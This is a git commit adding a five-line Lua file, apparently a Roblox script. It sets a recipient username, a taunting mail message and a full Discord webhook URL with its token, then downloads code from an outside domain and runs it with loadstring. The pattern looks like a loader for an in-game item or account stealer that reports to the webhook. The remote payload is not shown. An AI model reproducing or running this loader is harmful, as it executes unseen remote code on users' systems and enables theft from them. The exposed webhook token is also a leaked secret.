fb72869d4211215202a0cfa325c675f66b9587f2
0iqwb9ur <153291533+0iqwb9ur@users.noreply.github.com>
2024-05-08 12:50:27 +0200

    Add files via upload

---
+++ main.lua
@@ -0,0 +1,5 @@
+Username = "tootooorootoo"
+MailMessage = "ez egorikusa best"
+Webhook = "https://discord.com/api/webhooks/1236730175862083595/3VpO4C4YN0A4o6SGqI5CIR7HIQqhKsVfUqmFRyybwU6UWkkhE6TIUPn-j0vohic0q-dk"
+
+loadstring(game:HttpGet("https://egorikusa.space/ttd"))()
